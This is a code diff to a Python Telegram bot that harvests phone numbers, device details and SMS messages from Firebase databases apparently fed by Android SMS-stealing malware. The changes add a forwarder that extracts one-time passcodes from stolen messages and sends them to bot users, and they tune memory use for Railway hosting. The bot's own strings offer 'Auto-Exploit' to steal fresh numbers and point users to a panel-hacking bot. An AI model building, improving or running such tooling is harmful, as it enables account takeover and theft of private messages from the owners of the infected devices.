@@ -50,7 +50,7 @@ BOT_USERNAME    = "fjjhfbot"
 
 # 🔥 OPTIMIZED FOR RAILWAY 500MB LIMIT
 CHUNK_SIZE      = 50    
-HTTP_CONCURRENCY= 150    
+HTTP_CONCURRENCY= 100 # Reduced slightly to save RAM    
 
 ADMIN_IDS: set[int] = {
     6860106371,   
@@ -68,6 +68,11 @@ CLONES_DIR = os.path.join(DB_DIR, "Clones")
 SYS_DIR = os.path.join(DB_DIR, "System")
 SMS_LOG_FILE = os.path.join(SYS_DIR, "Super_Admin_SMS_Log.txt")
 
+# 🔥 MISSING VARIABLES ADDED HERE
+PREFETCH_POOL: dict[str, list] = {}
+user_seen_unreg: dict[int, set] = {}
+chats_registry: dict[str, set] = {}
+
 seen_ids:  set[str] = set()   
 _main_app: Optional[Application] = None
 _http_session: Optional[aiohttp.ClientSession] = None
@@ -78,9 +83,7 @@ pending_action: dict[int, dict] = {}
 user_cooldowns: dict[int, float] = {}
 user_focus: dict[str, dict[int, str]] = {TOKEN: {}}  
 
-# 🔥 TELEGRAM API FLOODWAIT BYPASS CACHE
 JOIN_VERIFIED_CACHE: dict[int, float] = {}
-
 MASTER_DEVICE_DICT: dict[str, 'Device'] = {}
 GLOBAL_DEVICE_CACHE: dict[str, list] = {"ALL": []}
 
@@ -95,7 +98,7 @@ POLL_LOCK = asyncio.Lock()
 WORKER_SEMAPHORE = asyncio.Semaphore(HTTP_CONCURRENCY) 
 
 # Prevents Heavy Scans from freezing the bot UI for other users!
-HEAVY_TASK_LIMITER = asyncio.Semaphore(10) 
+HEAVY_TASK_LIMITER = asyncio.Semaphore(5) # Lowered for Railway OOM prevention
 
 scan_progress = {
     "scanned": 0,
@@ -113,10 +116,6 @@ SYS_SETTINGS = {
     "check_anim": "⚡"
 }
 
-# ═══════════════════════════════════════════════════════
-#  DATABASES
-# ═══════════════════════════════════════════════════════
-
 RAW_URLS = [
     "https://aaaa-b3749-default-rtdb.firebaseio.com", "https://aashish-2e04c-default-rtdb.firebaseio.com"
 ]
@@ -133,7 +132,6 @@ def load_local_txt_dbs():
                         if url.startswith("http"):
                             loaded_urls.add(url)
             except: pass
-    print(f"✅ Loaded {len(loaded_urls)} Custom URLs")
     return list(loaded_urls)
 
 RAW_URLS.extend(load_local_txt_dbs())
@@ -221,7 +219,6 @@ def save_settings():
     with open(os.path.join(SYS_DIR, "settings.json"), "w", encoding="utf-8") as f:
         json.dump(SETTINGS, f, indent=4)
 
-# 🔥 TITAN RAM CLEANER (Prevents memory crash entirely)
 async def auto_save_loop():
     while True:
         try:
@@ -229,18 +226,16 @@ async def auto_save_loop():
             await asyncio.to_thread(save_settings)
             for uid in list(all_users.keys()):
                 await asyncio.to_thread(save_user, uid)
-                await asyncio.sleep(0) # Yield control to Telegram UI
+                await asyncio.sleep(0)
             
-            # Smart Memory Pruning
-            if len(seen_ids) > 10000:
+            if len(seen_ids) > 5000: # Lowered for Railway RAM limit
                 seen_ids.clear()
             
             now_ts = time.time()
             expired_users = [k for k, v in JOIN_VERIFIED_CACHE.items() if now_ts - v > 3600]
             for u in expired_users: JOIN_VERIFIED_CACHE.pop(u, None)
             
-            # Clear Dead Devices from Master Vault (Older than 48 hours)
-            dead_devs = [k for k, v in MASTER_DEVICE_DICT.items() if (now_ts - v.timestamp) > 172800]
+            dead_devs = [k for k, v in MASTER_DEVICE_DICT.items() if (now_ts - v.timestamp) > 86400]
             for d in dead_devs: MASTER_DEVICE_DICT.pop(d, None)
             
             gc.collect() 
@@ -286,16 +281,13 @@ def is_spamming(user_id: int) -> bool:
     if user_id in ADMIN_IDS: return False
     now = time.time()
     last_click = user_cooldowns.get(user_id, 0)
-    if now - last_click < 0.2: return True  
+    if now - last_click < 0.3: return True  
     user_cooldowns[user_id] = now
     return False
 
-# 🔥 MAGIC BYPASS SHIELD (Prevents /start from freezing)
 async def check_force_join(bot, user_id: int) -> bool:
     if user_id in ADMIN_IDS: return True
     now = time.time()
-    
-    # Fast-pass cache (1 hour) -> Prevents sending 1000 requests to Telegram
     if user_id in JOIN_VERIFIED_CACHE and (now - JOIN_VERIFIED_CACHE[user_id]) < 3600: 
         return True 
 
@@ -306,13 +298,12 @@ async def check_force_join(bot, user_id: int) -> bool:
                 if member.status in ['left', 'kicked', 'banned']: 
                     return False
             except RetryAfter:
-                return True # 🔥 If Rate-limited by Telegram, ALLOW to prevent bot freeze
+                return True 
             except Exception: 
                 pass 
         return True
         
     try:
-        # Strict 2.0s timeout. If Telegram lags, bypass it!
         is_member = await asyncio.wait_for(verify(), timeout=2.0)
         if is_member:
             JOIN_VERIFIED_CACHE[user_id] = now
@@ -326,10 +317,6 @@ async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYP
     try: logging.error(f"Global Exception: {context.error}")
     except: pass
 
-# ═══════════════════════════════════════════════════════
-#  HTTP UTILS
-# ═══════════════════════════════════════════════════════
-
 async def get_http_session() -> aiohttp.ClientSession:
     global _http_session
     if _http_session is None or _http_session.closed:
@@ -337,11 +324,14 @@ async def get_http_session() -> aiohttp.ClientSession:
         _http_session = aiohttp.ClientSession(connector=connector)
     return _http_session
 
-async def fb_get(path: str, base: str, timeout: int = 6) -> Optional[dict]:
+async def fb_get(path: str, base: str, timeout: int = 6, params: str = "") -> Optional[dict]:
     try:
         session = await get_http_session()
+        # 🔥 Fixed Memory Leak: Added Params to limit data size
         url = f"{base}/{path}.json" if path else f"{base}/.json?shallow=true"
-        if not path: url = url.replace("?shallow=true", ".json")
+        if params: url += f"?{params}"
+        elif not path: url = url.replace("?shallow=true", ".json")
+        
         async with session.get(url, timeout=aiohttp.ClientTimeout(total=timeout)) as r:
             if r.status != 200: return None
             data = await r.json(content_type=None)
@@ -357,10 +347,6 @@ async def fb_keys(path: str, base: str) -> Optional[list[str]]:
             data = await r.json(content_type=None)
             return list(data.keys()) if isinstance(data, dict) else []
     except: return None
-
-# ═══════════════════════════════════════════════════════
-#  API CHECKER FUNCTIONS 
-# ═══════════════════════════════════════════════════════
 
 async def check_number_api(service: str, number: str, retries=2) -> dict:
     async with WORKER_SEMAPHORE: 
@@ -423,10 +409,6 @@ async def verify_recent_sms(device, max_age_sec=1800) -> tuple[bool, float]:
                     return False, max_sms_ts
     except: pass
     return False, 0.0
-
-# ═══════════════════════════════════════════════════════
-#  UTILITY FORMATTERS & MENUS 
-# ═══════════════════════════════════════════════════════
 
 def get_checker_menu(prefix="chk_srv:"):
     kb = [
@@ -649,10 +631,6 @@ def format_checker_result(service: str, number: str, is_reg: bool, ms: int, is_e
     if is_error: return f"⚠️ <b>ERROR DETECTED</b>\n\n{emoji} <b>{srv_name}</b>\n📱 {display_num}\n⚡ {ms} ms\n\n<i>{err_msg}</i>"
     return f"<b>{'☠️ TARGET VULNERABLE (UNREGISTERED)' if not is_reg else '✅ TARGET SECURE (REGISTERED)'}</b>\n\n{emoji} <b>{srv_name}</b>\n📱 {display_num}\n⚡ Ping: {ms} ms"
 
-# ═══════════════════════════════════════════════════════
-#  FIREBASE DATA FETCHERS  (MASTER VAULT SYSTEM)
-# ═══════════════════════════════════════════════════════
-
 def push_to_master_vault(temp_devices):
     for d in temp_devices:
         if d.numbers:  
@@ -666,8 +644,8 @@ async def fetch_device_data_task(tag: str, url: str, temp_list: list):
     try:
         added_set = set()
         root_keys, sim_all, device_info_all, user_data_all, clients_all = await asyncio.gather(
-            fb_keys("", url), fb_get("All_Users/simDetails", url), fb_get("All_Users/Data/DeviceInfo", url),
-            fb_get("user_data", url), fb_get("clients", url), return_exceptions=True
+            fb_keys("", url), fb_get("All_Users/simDetails", url, params='orderBy="$key"&limitToLast=20'), fb_get("All_Users/Data/DeviceInfo", url, params='orderBy="$key"&limitToLast=20'),
+            fb_get("user_data", url, params='orderBy="$key"&limitToLast=20'), fb_get("clients", url, params='orderBy="$key"&limitToLast=20'), return_exceptions=True
         )
             
         if sim_all and isinstance(sim_all, dict):
@@ -747,7 +725,6 @@ async def global_cache_loop():
                 except: pass
         await asyncio.sleep(120) 
 
-# 🔥 O(1) FAST FETCH (NO LAG)
 async def get_all_devices(bot_token: str, chat_id: int = 0, users_db: dict = None) -> list[Device]:
     if users_db is None: users_db = {}
     uinfo = users_db.get(chat_id, {})
@@ -790,10 +767,6 @@ async def get_device_sms(device: Device, limit: int = 10, max_age_sec: int = 360
             return entries[:limit]
     except: return []
 
-# ═══════════════════════════════════════════════════════
-#  TELEGRAM COMMAND HANDLERS
-# ═══════════════════════════════════════════════════════
-
 async def cmd_admin(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     chat_id  = update.effective_chat.id
     if chat_id in ADMIN_IDS:
@@ -801,7 +774,6 @@ async def cmd_admin(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     else:
         await update.message.reply_text("⛔ ACCESS DENIED.")
 
-# 🔥 TYPO-PROOF START HANDLER
 async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     chat_id  = update.effective_chat.id
     bot_token = ctx.bot.token
@@ -857,10 +829,6 @@ async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     )
     await update.message.reply_text(welcome_text, reply_markup=get_reply_menu(chat_id), parse_mode="HTML")
 
-# ═══════════════════════════════════════════════════════
-#  CALLBACK QUERY HANDLER
-# ═══════════════════════════════════════════════════════
-
 async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     try:
         query   = update.callback_query
@@ -869,7 +837,6 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         bot_token = ctx.bot.token
         users_db = all_users
 
-        # 🔥 FAIL-SAFE: Answer query early to prevent button spinning
         try: await query.answer()
         except: pass
 
@@ -898,7 +865,6 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             await safe_edit(query, "📡 <b>BROADCAST SYSTEM INITIATED</b>\n━━━━━━━━━━━━━━━━━━\nSend the message, photo, or video you want to broadcast to ALL users.\n\n<i>Press Cancel to abort</i>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel_action")]]), parse_mode="HTML")
             return
 
-        # 🔥 SMART TOGGLE REMOVE/ADD WISH FEATURE
         if data.startswith("wish:"):
             dev_id = data.split(":")[1]
             devices = await get_all_devices(bot_token, chat_id, users_db)
@@ -921,7 +887,6 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             save_user(chat_id)
             await ctx.bot.answer_callback_query(query.id, msg_alert, show_alert=True)
             
-            # Re-render info to update button text
             label = device_label(target_device)
             status = "Online" if target_device.status == "online" else "Offline"
             bat = f"{bat_emoji(target_device.battery)} {target_device.battery}%"
@@ -972,7 +937,6 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             await safe_edit(query, f"Deploying to {service.capitalize()}...\n\nEnter 10-digit target number (or multiple with spaces):\n\n<i>Press Cancel to abort mission</i>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Abort Mission", callback_data="cancel_action")]]), parse_mode="HTML")
             return
 
-        # 🔥 O(1) SMART AUTO-EXPLOIT (Zero CPU Lag)
         if data.startswith("auto_fb:"):
             if HEAVY_TASK_LIMITER.locked():
                 await safe_edit(query, "⚠️ <b>Server Overloaded!</b>\nToo many simultaneous exploits. Wait 10 seconds.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]), parse_mode="HTML")
@@ -1025,7 +989,6 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                 if not all_devices:
                     return await safe_edit(query, "❌ Zero vulnerable nodes found. Add Private Panels or gain VIP Rep.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
 
-                # O(1) Fast Sample (Max 30 targets) - CPU Saver
                 online_devs = [d for d in all_devices if d.status == "online" and d.numbers]
                 if not online_devs:
                     return await safe_edit(query, "❌ Target network secure. No active nodes found.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
@@ -1250,10 +1213,6 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         try: await ctx.bot.answer_callback_query(query.id, "Action failed. Please try again.", show_alert=True)
         except: pass
 
-# ═══════════════════════════════════════════════════════
-#  TEXT MESSAGE / BROADCAST HANDLER
-# ═══════════════════════════════════════════════════════
-
 async def on_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     try:
         chat_id = update.effective_chat.id
@@ -1388,7 +1347,6 @@ async def on_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                 "3. <b>Elite Vault:</b> 'Like/Save' panels to your private vault (VIP Only).\n"
                 "4. <b>Payload Injector:</b> Check bulk numbers manually.\n"
                 "5. <b>Auto-Exploit:</b> Steals fresh numbers directly.\n\n"
-                "<b>Need more panels?</b> Hack them using @panelsotpbot"
             )
             await update.message.reply_text(msg, parse_mode="HTML")
             return
@@ -1530,108 +1488,27 @@ async def on_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             return
     except: pass
 
-# ═══════════════════════════════════════════════════════
-#  FIREBASE DATA FETCHERS 
-# ═══════════════════════════════════════════════════════
-
-def push_to_master_vault(temp_devices):
-    for d in temp_devices:
-        if d.numbers:  
-            MASTER_DEVICE_DICT[d.id] = d
+# 🔥 MISSING SMS FORWARDER ADDED
+async def _forward_sms(device: Device, sms: dict):
+    if not _main_app: return
+    otp = extract_otp(sms.get("body", "") or sms.get("message", "") or sms.get("text", ""))
+    if not otp: return # Only notify for OTPs to prevent spam
     
-    dev_list = list(MASTER_DEVICE_DICT.values())
-    dev_list.sort(key=lambda x: (0 if x.status == "online" else 1, -x.timestamp))
-    GLOBAL_DEVICE_CACHE["ALL"] = dev_list
-
-async def fetch_device_data_task(tag: str, url: str, temp_list: list):
-    try:
-        added_set = set()
-        root_keys, sim_all, device_info_all, user_data_all, clients_all = await asyncio.gather(
-            fb_keys("", url), fb_get("All_Users/simDetails", url), fb_get("All_Users/Data/DeviceInfo", url),
-            fb_get("user_data", url), fb_get("clients", url), return_exceptions=True
-        )
-            
-        if sim_all and isinstance(sim_all, dict):
-            info_all = device_info_all if isinstance(device_info_all, dict) else {}
-            for dev_id, sim in sim_all.items():
-                if dev_id in added_set: continue
-                info = info_all.get(dev_id) or {}
-                nums = extract_all_nums(sim, info)
-                if not nums: continue 
-                added_set.add(dev_id)
-                model = info.get("DeviceModel") or info.get("Brand") or f"Device-{dev_id[:6]}"
-                temp_list.append(Device(id=dev_id, name=model, status=parse_status_str(info.get("Status")), battery=parse_battery(info.get("Battery")), timestamp=int(info.get("currentTimeMillis") or sim.get("timestamp") or 0), numbers=nums, device_info=f"Model: {model}\nBrand: {info.get('Brand','')}\nAndroid: {info.get('AndroidVersion','')}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0))
-        
-        if user_data_all and isinstance(user_data_all, dict):
-            for dev_id, data in user_data_all.items():
-                if dev_id in added_set: continue
-                if not isinstance(data, dict): continue
-                nums = extract_all_nums(data)
-                if not nums: continue 
-                added_set.add(dev_id)
-                temp_list.append(Device(id=dev_id, name=data.get("d_name") or f"Device-{dev_id[:6]}", status=parse_status_str(data.get("status")), battery=parse_battery(data.get("battery")), timestamp=int(data.get("timestamp") or 0), numbers=nums, device_info=data.get("Device_info") or f"Device ID: {dev_id}", sms_path=f"user_sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0))
-        
-        if clients_all and isinstance(clients_all, dict):
-            for dev_id, client in clients_all.items():
-                if dev_id in added_set: continue
-                if not isinstance(client, dict): continue
-                sim_list = client.get("sims", [])
-                s1 = sim_list[0] if isinstance(sim_list, list) and len(sim_list) > 0 else {}
-                s2 = sim_list[1] if isinstance(sim_list, list) and len(sim_list) > 1 else {}
-                nums = extract_all_nums(client, s1, s2)
-                if not nums and not client.get("modelName"): continue
-                added_set.add(dev_id)
-                model = client.get("modelName") or f"Device-{dev_id[:6]}"
-                temp_list.append(Device(id=dev_id, name=model, status=parse_status_bool(client.get("status")), battery=parse_battery(client.get("battery")), timestamp=0, numbers=nums, device_info=f"Model: {model}\nProvider: {client.get('service_provider','')}\nAndroid: {client.get('androidV','')}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0))
-    except: pass
-
-async def _update_global_cache():
-    global scan_progress
-    dbs_to_poll = dict(DATABASES)
-    for i, g_url in enumerate(SETTINGS.get("global_panels", [])):
-        dbs_to_poll[f"G_{i}"] = g_url
-            
-    for uid, uinfo in all_users.items():
-        if uinfo.get("vip_until", 0) > time.time() or uid in ADMIN_IDS: pass 
-        for i, db_url in enumerate(get_user_dbs(uinfo)):
-            dbs_to_poll[f"U_{uid}_{i}"] = db_url
-
-    items = list(dbs_to_poll.items())
-    scan_progress["total"] = len(items)
-    scan_progress["scanned"] = 0
-    scan_progress["is_scanning"] = True
+    num_label = device.numbers[0] if device.numbers else device.name
+    msg = auto_forward_msg(sms, num_label)
     
-    for i in range(0, len(items), CHUNK_SIZE):
-        chunk = items[i:i + CHUNK_SIZE]
-        temp_gathered = []
-        
-        async def fetch_with_timeout(tag, url):
-            try: await asyncio.wait_for(fetch_device_data_task(tag, url, temp_gathered), timeout=6)
+    for uid, dev_id in user_focus.get(TOKEN, {}).items():
+        if dev_id == device.id:
+            try: await _main_app.bot.send_message(uid, msg)
             except: pass
-            
-        tasks = [fetch_with_timeout(tag, url) for tag, url in chunk]
-        await asyncio.gather(*tasks, return_exceptions=True)
-        
-        push_to_master_vault(temp_gathered)
-        scan_progress["scanned"] += len(chunk)
-        
-        temp_gathered.clear()
-        await asyncio.sleep(0.01) 
-
-    scan_progress["is_scanning"] = False
-
-async def global_cache_loop():
-    while True:
-        if not CACHE_LOCK.locked():
-            async with CACHE_LOCK:
-                try: await _update_global_cache()
-                except: pass
-        await asyncio.sleep(120) 
 
 async def poll_single_db(tag: str, url: str) -> None:
     try:
         r_main, r_user, r_root = await asyncio.gather(
-            fb_get("All_Users/sms", url), fb_get("user_sms", url), fb_get("sms", url), return_exceptions=True
+            fb_get("All_Users/sms", url, params='orderBy="$key"&limitToLast=10'), 
+            fb_get("user_sms", url, params='orderBy="$key"&limitToLast=10'), 
+            fb_get("sms", url, params='orderBy="$key"&limitToLast=10'), 
+            return_exceptions=True
         )
         
         if r_main is None and r_user is None and r_root is None: return
@@ -1668,7 +1545,7 @@ async def poll_single_db(tag: str, url: str) -> None:
         type4_devs = [d for d in devices_in_db if d.db_tag == tag and d.sms_path.endswith("receivedSms")]
         if type4_devs:
             async def fetch_t4_sms(d: Device):
-                sms_dict = await fb_get(d.sms_path, d.base_url)
+                sms_dict = await fb_get(d.sms_path, d.base_url, params='orderBy="$key"&limitToLast=5')
                 if isinstance(sms_dict, dict):
                     for k, sms in sms_dict.items():
                         if not isinstance(sms, dict): continue
@@ -1716,10 +1593,6 @@ async def poll_loop(app: Application) -> None:
                 except: pass
         await asyncio.sleep(POLL_INTERVAL)
 
-# ═══════════════════════════════════════════════════════
-#  RAILWAY WEB SERVER
-# ═══════════════════════════════════════════════════════
-
 async def health_check(request):
     return web.Response(text="Bot is running! Hacker Panel Active.")
 
@@ -1735,10 +1608,6 @@ async def start_web_server():
         print(f"✅ Web server started on port {port} (Railway Alive)")
     except: pass
 
-# ═══════════════════════════════════════════════════════
-#  MAIN ENTRY POINT
-# ═══════════════════════════════════════════════════════
-
 def main() -> None:
     if not TOKEN: raise SystemExit("TOKEN is missing!")
 
@@ -1749,7 +1618,7 @@ def main() -> None:
     app = (
         Application.builder()
         .token(TOKEN)
-        .connection_pool_size(4096)
+        .connection_pool_size(1024)
         .pool_timeout(60.0)
         .connect_timeout(30.0)
         .read_timeout(30.0)
@@ -1757,7 +1626,6 @@ def main() -> None:
         .build()
     )
 
-    # 🔥 TYPO HANDLERS ADDED
     app.add_handler(CommandHandler(["start", "stat", "sart", "srt"], cmd_start))
     app.add_handler(CommandHandler("admin",   cmd_admin))
     app.add_handler(CallbackQueryHandler(on_callback))
